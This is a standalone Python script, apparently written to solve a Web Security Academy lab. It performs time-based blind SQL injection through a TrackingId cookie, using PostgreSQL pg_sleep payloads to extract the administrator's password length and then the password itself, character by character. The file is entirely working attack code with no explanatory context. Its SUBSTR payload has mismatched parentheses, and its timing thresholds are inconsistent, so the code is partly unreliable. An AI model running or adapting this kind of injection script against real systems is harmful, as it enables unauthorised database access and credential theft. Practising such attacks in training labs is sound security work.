import requests
import time

url = 'https://0a0a00c3042a48278921299300ba008f.web-security-academy.net/'
characters = 'abcdefghijklmnopqrstuvwxyz1234567890 '


def get_length():
    for i in range(1, 51):
        cookie = {'TrackingId': '', 'session': 'oNJXh7kyK41xLmhfqqA8i8peCRbDBSIT'}
        payload = f"'||CASE WHEN ((LENGTH((SELECT password FROM users WHERE username='administrator')))={i}) THEN pg_sleep(2) ELSE NULL END--"
        cookie['TrackingId'] += payload
        req = requests.get(url, cookies=cookie)
        if req.elapsed.seconds >= 2:
            return i
        else:
            continue


def injection(length):
    passwd = ''
    for i in range(1, length+1):
        for char in characters:
            cookie = {'TrackingId': '', 'session': 'oNJXh7kyK41xLmhfqqA8i8peCRbDBSIT'}
            payload = f"'||CASE WHEN ((SUBSTR((select password from users where username='administrator')),{i},1)='{char}') THEN pg_sleep(2) ELSE NULL END--"
            cookie['TrackingId'] += payload
            req = requests.get(url, cookies=cookie)
            if req.elapsed.seconds > 2:
                passwd += char
                print(f"Fetching password: {passwd}....")
                break
            else:
                continue
    return passwd


#print("Getting length....Please be patient...")
#pass_length = get_length()
#print(f"Password length: {pass_length}")

print("Now, trying to get password. Please wait for a while!")
Password = injection(20)
print(f"Found password: {Password}")
